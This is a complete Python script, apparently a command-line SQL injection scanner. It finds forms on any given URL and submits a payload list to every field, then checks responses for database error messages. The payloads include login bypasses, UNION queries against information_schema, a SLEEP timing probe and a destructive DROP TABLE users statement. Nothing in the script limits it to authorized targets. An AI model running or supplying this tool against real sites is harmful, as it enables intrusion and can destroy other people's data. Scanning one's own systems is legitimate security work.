import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import sys
import time
import threading

# Enhanced list of SQL injection payloads
sql_payloads = [
    "' OR 1=1 --",
    "' OR 'a'='a",
    '" OR "a"="a"',
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT table_name FROM information_schema.tables --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "' OR 1=1#",
    "' OR SLEEP(5) --",
    "' OR 1=1/*",
    "'; DROP TABLE users --",
    '" OR "a"="a" --',
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
]

# Common SQL error messages for detection
sql_error_signatures = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate[hy000]",
    "microsoft odbc",
    "syntax error",
]

# Function to send HTTP requests
def send_request(url, data=None, headers=None):
    try:
        if data:
            response = requests.post(url, data=data, headers=headers)
        else:
            response = requests.get(url, headers=headers)
        return response
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None

# Function to find forms on a page
def find_forms(url, headers=None):
    response = send_request(url, headers=headers)
    if response and response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        return forms
    return []

# Function to test SQL injection on a form
def test_form(url, form, method, headers=None):
    action_url = form.get('action', '')
    if not action_url.startswith("http"):
        action_url = urljoin(url, action_url)

    # Extract form inputs
    inputs = form.find_all('input')
    data = {}
    for input_tag in inputs:
        name = input_tag.get('name', '')
        input_type = input_tag.get('type', 'text')
        if input_type == 'hidden' or input_type == 'text':
            data[name] = "' OR '1'='1"
        elif input_type == 'password':
            data[name] = "' OR '1'='1"
        else:
            data[name] = 'test'

    for payload in sql_payloads:
        for key in data.keys():
            data[key] = payload
            print(f"Testing with payload: {payload}")
            if method == 'post':
                response = send_request(action_url, data=data, headers=headers)
            else:
                response = send_request(action_url + "?" + "&".join([f"{k}={v}" for k, v in data.items()]), headers=headers)

            if response and response.status_code == 200:
                for error_signature in sql_error_signatures:
                    if error_signature in response.text.lower():
                        print(f"[!] Potential SQL Injection vulnerability detected with payload: {payload}")
                        return True
            time.sleep(0.5)  # To avoid overwhelming the server
    return False

# Main function to scan a URL
def scan_url(url, headers=None):
    print(f"Scanning {url} for forms...")
    forms = find_forms(url, headers=headers)

    if forms:
        print(f"{len(forms)} form(s) detected. Testing for SQL Injection vulnerabilities...")
        for form in forms:
            method = form.get('method', 'get').lower()
            vulnerable = test_form(url, form, method, headers=headers)
            if vulnerable:
                print("[+] Vulnerability found and logged!")
                break
    else:
        print("No forms detected on this page.")

# Threaded scanning function
def threaded_scan(urls, headers=None):
    threads = []
    for url in urls:
        t = threading.Thread(target=scan_url, args=(url, headers))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

# Main function to accept command-line arguments
def main():
    if len(sys.argv) < 3 or sys.argv[1] != '-u':
        print("Usage: python sqlscan.py -u <url> [optional: --headers 'User-Agent: ...']")
        sys.exit(1)

    url = sys.argv[2]
    headers = None

    if len(sys.argv) > 3 and sys.argv[3] == '--headers':
        headers = {k: v for k, v in [h.split(": ") for h in sys.argv[4].split(",")]}
    
    scan_url(url, headers=headers)

if __name__ == "__main__":
    main()